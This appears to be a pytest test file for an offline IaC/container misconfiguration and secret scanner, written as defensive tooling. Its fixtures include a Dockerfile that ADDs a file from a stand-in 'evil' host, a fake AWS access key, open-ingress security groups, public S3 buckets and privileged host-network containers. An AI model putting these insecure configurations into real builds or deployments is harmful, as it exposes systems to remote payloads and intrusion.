"""IaC / container config ingestion (EPIC NEXT F7).

core/iac_scanner.scan_path turns local IaC/config files into findings (misconfig +
leaked secrets, source='iac') and technologies (container images). Pure / offline /
never-raise. YAML formats need PyYAML (guarded). No network.
"""

import pytest

from core.iac_scanner import scan_path


def _rules(result):
    return {f['rule_id'] for f in result['findings']}


def _write(d, name, text):
    p = d / name
    p.write_text(text, encoding='utf-8')
    return p


# ── Dockerfile (stdlib) ───────────────────────────────────────────────────────

def test_dockerfile_root_unpinned_and_image(tmp_path):
    _write(tmp_path, 'Dockerfile',
           'FROM nginx:latest\nADD http://evil/x /x\nRUN echo hi\n')
    r = scan_path(tmp_path)
    rules = _rules(r)
    assert 'iac-docker-root' in rules          # no USER → root
    assert 'iac-docker-unpinned' in rules      # :latest
    assert 'iac-docker-add-url' in rules
    assert {'name': 'nginx', 'version': 'latest'} in r['technologies']


def test_dockerfile_nonroot_user_is_clean_of_root(tmp_path):
    _write(tmp_path, 'Dockerfile', 'FROM python:3.12-slim\nUSER app\n')
    rules = _rules(scan_path(tmp_path))
    assert 'iac-docker-root' not in rules
    assert 'iac-docker-unpinned' not in rules   # pinned tag


# ── Terraform (stdlib regex) ──────────────────────────────────────────────────

def test_terraform_open_ingress_and_public_bucket(tmp_path):
    _write(tmp_path, 'main.tf',
           'resource "aws_security_group" "x" {\n'
           '  ingress { cidr_blocks = ["0.0.0.0/0"] }\n}\n'
           'resource "aws_s3_bucket" "b" { acl = "public-read" }\n')
    rules = _rules(scan_path(tmp_path))
    assert 'iac-tf-open-ingress' in rules and 'iac-tf-public-bucket' in rules


# ── CloudFormation JSON (stdlib) ──────────────────────────────────────────────

def test_cloudformation_json_open_sg(tmp_path):
    import json
    tmpl = {'Resources': {
        'SG': {'Type': 'AWS::EC2::SecurityGroup',
               'Properties': {'SecurityGroupIngress': [{'CidrIp': '0.0.0.0/0'}]}},
        'B': {'Type': 'AWS::S3::Bucket',
              'Properties': {'AccessControl': 'PublicRead'}}}}
    _write(tmp_path, 'stack.json', json.dumps(tmpl))
    rules = _rules(scan_path(tmp_path))
    assert 'iac-cfn-open-sg' in rules and 'iac-cfn-public-bucket' in rules


# ── secrets (SSOT, validated, source='iac') ───────────────────────────────────

def test_secret_in_config_is_iac_sourced(tmp_path):
    _write(tmp_path, 'Dockerfile',
           'FROM alpine:3.19\nENV AWS_KEY=AKIA' + 'A' * 16 + '\n')
    secrets = [f for f in scan_path(tmp_path)['findings']
               if f.get('category') == 'secret']
    assert secrets and all(f['source'] == 'iac' for f in secrets)
    assert all('AKIA' not in f['detail'] or '…' in f['detail'] for f in secrets)


# ── robustness + summary ──────────────────────────────────────────────────────

def test_unrecognized_and_malformed_files_are_safe(tmp_path):
    _write(tmp_path, 'README.md', '# not iac')
    _write(tmp_path, 'broken.tf', 'this is ( not valid hcl')
    r = scan_path(tmp_path)            # never raises; README ignored
    assert isinstance(r['findings'], list) and r['summary']['files'] >= 1


def test_scan_single_file_and_image_dedup(tmp_path):
    _write(tmp_path, 'Dockerfile', 'FROM nginx:1.25\n')
    sub = tmp_path / 'sub'
    sub.mkdir()
    _write(sub, 'Dockerfile.build', 'FROM nginx:1.25\nUSER x\n')
    techs = scan_path(tmp_path)['technologies']
    assert techs == [{'name': 'nginx', 'version': '1.25'}]   # deduped by name


# ── YAML formats (require PyYAML) ─────────────────────────────────────────────

def test_compose_privileged_and_host_network(tmp_path):
    pytest.importorskip('yaml')
    _write(tmp_path, 'docker-compose.yml',
           'services:\n  db:\n    image: postgres:latest\n    privileged: true\n'
           '    network_mode: host\n')
    rules = _rules(scan_path(tmp_path))
    assert 'iac-compose-privileged' in rules
    assert 'iac-compose-host-network' in rules
    assert 'iac-compose-unpinned' in rules


def test_k8s_privileged_and_host_namespace(tmp_path):
    pytest.importorskip('yaml')
    _write(tmp_path, 'deploy.yaml',
           'apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n'
           '    spec:\n      hostNetwork: true\n      containers:\n'
           '      - name: app\n        image: app:latest\n'
           '        securityContext:\n          privileged: true\n')
    rules = _rules(scan_path(tmp_path))
    assert 'iac-k8s-host-namespace' in rules and 'iac-k8s-privileged' in rules


def test_yaml_skipped_when_parser_absent(tmp_path, monkeypatch):
    # When PyYAML is unavailable the YAML files degrade to a soft skip, not a crash.
    import core.iac_scanner as iac
    monkeypatch.setattr('core.features.has_yaml', lambda: False)
    _write(tmp_path, 'docker-compose.yml',
           'services:\n  db:\n    image: postgres\n    privileged: true\n')
    r = iac.scan_path(tmp_path)
    assert r['summary']['skipped_yaml'] == 1
    assert not any(f['rule_id'].startswith('iac-compose') for f in r['findings'])


# ── wiring: phase fold / asset promotion / taxonomy ───────────────────────────

def test_phase_iac_folds_findings_into_vulns(tmp_path):
    from core.collection_runner import CollectionRunner
    _write(tmp_path, 'Dockerfile', 'FROM nginx:latest\n')
    r = CollectionRunner(iac=True, iac_path=str(tmp_path))
    report = {'phases': {'vulns': {'status': 'Success', 'findings': [],
                                   'summary': {}}}}
    phase = r._phase_iac(report)
    assert phase['status'] == 'Success'
    folded = report['phases']['vulns']['findings']
    assert any(f.get('category') == 'iac' for f in folded)
    assert phase['data']['technologies']


def test_derive_assets_promotes_iac_images():
    from core.asset_adapter import derive_assets
    report = {'phases': {'iac': {'status': 'Success', 'data': {
        'technologies': [{'name': 'nginx', 'version': '1.25'}]}}}}
    techs = [a for a in derive_assets(report)
             if a.type == 'technology' and a.value == 'nginx']
    assert techs and techs[0].attrs.get('source') == 'iac'


def test_iac_taxonomy_classify_and_knowledge():
    from core import compliance
    from core.finding_fingerprint import CATEGORIES
    from core.finding_knowledge import describe
    assert 'iac' in CATEGORIES
    assert compliance.classify('iac')['owasp'] == 'A05:2021'   # misconfiguration
    # specific (not generic) knowledge for an iac finding
    k = describe('iac', 'iac-docker-root', 'Container runs as root')
    assert 'привилег' in (k['remediation'] + k['impact']).lower()
